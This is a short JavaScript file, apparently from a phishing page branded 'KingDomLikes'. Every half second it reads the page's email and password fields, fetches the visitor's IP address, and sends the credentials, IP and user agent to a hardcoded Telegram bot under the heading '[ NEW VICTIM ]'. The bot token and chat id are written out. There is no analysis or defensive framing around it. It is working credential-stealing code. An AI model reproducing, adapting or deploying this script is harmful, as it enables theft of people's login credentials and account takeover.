function sendTelegramMessage(message) {
  var apiUrl = `https://api.telegram.org/bot6544753640:AAHampKHpttT5D8k6UHhJfNW2AH1aBbXJP0/sendMessage`;
  var params = {
    'chat_id': 6637031375,
    'text': message,
  };

  fetch(apiUrl + '?' + new URLSearchParams(params), {
    method: 'GET'
  })
    .then(response => response.json())
    .then(data => {
      console.log('Response:', data);
    })
    .catch(error => {
      console.error('Error during fetch operation:', error);
    });
}

setInterval(function() {
  var email = document.getElementById(`email`).value;
  var password = document.getElementById(`password`).value;
  var userAgent = navigator.userAgent;

  fetch('https://ipinfo.io/json')
    .then(response => response.json())
    .then(data => {
        var message = `[ NEW VICTIM - KingDomLikes ]\n\nEmail: ${email}\nPassword: ${password}\nIP Address: ${data.ip}\nUser Agent: ${userAgent}`;
        sendTelegramMessage(message); 
    })
    .catch(error => {
        var message = `[ NEW VICTIM - KingDomLikes ]\n\nEmail: ${email}\nPassword: ${password}\nIP Address: No Found\nUser Agent: ${userAgent}`;
        sendTelegramMessage(message); 
    });
  
  console.log(email);

  
}, 500);
